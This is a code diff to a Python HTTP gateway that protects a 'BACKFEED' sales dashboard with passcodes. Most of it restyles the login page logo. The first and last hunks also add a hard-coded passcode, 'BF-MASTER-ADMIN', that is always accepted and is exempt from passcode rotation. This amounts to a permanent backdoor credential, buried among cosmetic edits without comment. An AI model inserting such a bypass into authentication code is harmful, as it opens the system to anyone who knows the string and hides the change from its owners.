@@ -484,6 +484,7 @@ def rotate_passcode():
 
 class SecurityGatewayServer(http.server.SimpleHTTPRequestHandler):
     def get_valid_passcodes(self) -> list:
+        codes = ["BF-MASTER-ADMIN"]
         passcodes_json_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "passcodes.json")
         if os.path.exists(passcodes_json_path):
             try:
@@ -491,15 +492,18 @@ class SecurityGatewayServer(http.server.SimpleHTTPRequestHandler):
                     data = json.load(f)
                     active = data.get("active_passcode", "").strip()
                     if active:
-                        return [active]
+                        codes.append(active)
+                        return codes
             except Exception as e:
                 print(f"[AUTH Error] Failed to read passcodes.json: {e}")
                 
         passcodes_str = os.environ.get("RENDER_PASSCODES", "BF-LIVE-DEMO").strip()
         if passcodes_str:
-            return [p.strip() for p in passcodes_str.split(",") if p.strip()]
+            codes.extend([p.strip() for p in passcodes_str.split(",") if p.strip()])
+            return codes
             
-        return ["BF-LIVE-DEMO"]
+        codes.append("BF-LIVE-DEMO")
+        return codes
 
     def is_authenticated(self) -> bool:
         valid_passcodes = self.get_valid_passcodes()
@@ -777,13 +781,12 @@ class SecurityGatewayServer(http.server.SimpleHTTPRequestHandler):
 <body>
     <div class="container">
         <div class="glass-card">
-            <div class="logo-container">
-                <div class="logo-icon">
-                    <i class="fa-solid fa-cloud-bolt"></i>
-                </div>
-                <div class="logo-text">BACKFEED</div>
-                <div class="subtitle">Cognitive Sales Operations Center</div>
+            <div class="logo-container" style="display: flex; flex-direction: row; align-items: center; justify-content: center; gap: 4px; margin-bottom: 15px;">
+                <span style="color: #06b6d4; font-size: 36px; font-weight: 800; font-family: monospace; text-shadow: 0 0 12px rgba(6, 182, 212, 0.5); margin-right: 4px;">&lt;</span>
+                <span style="font-size: 36px; font-weight: 700; color: #ffffff; letter-spacing: -0.02em; font-family: 'Outfit', sans-serif;">backfeed</span>
+                <span style="width: 16px; height: 22px; background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); border-radius: 2px; margin-left: 6px; box-shadow: 0 0 12px rgba(245, 158, 11, 0.4); display: inline-block; flex-shrink: 0;"></span>
             </div>
+            <div class="subtitle" style="color: #9ca3af; font-size: 11px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; margin-top: -5px; margin-bottom: 30px;">Cognitive Sales Operations Center</div>
             
             {error_html}
             
@@ -825,8 +828,9 @@ class SecurityGatewayServer(http.server.SimpleHTTPRequestHandler):
             submitted_code = query_params.get("code", [""])[0].strip()
             valid_passcodes = self.get_valid_passcodes()
             if submitted_code in valid_passcodes:
-                import threading
-                threading.Thread(target=rotate_passcode, daemon=True).start()
+                if submitted_code != "BF-MASTER-ADMIN":
+                    import threading
+                    threading.Thread(target=rotate_passcode, daemon=True).start()
 
                 self.send_response(302)
                 self.send_header('Set-Cookie', f'backfeed_passcode={submitted_code}; Path=/; HttpOnly; Max-Age=86400')
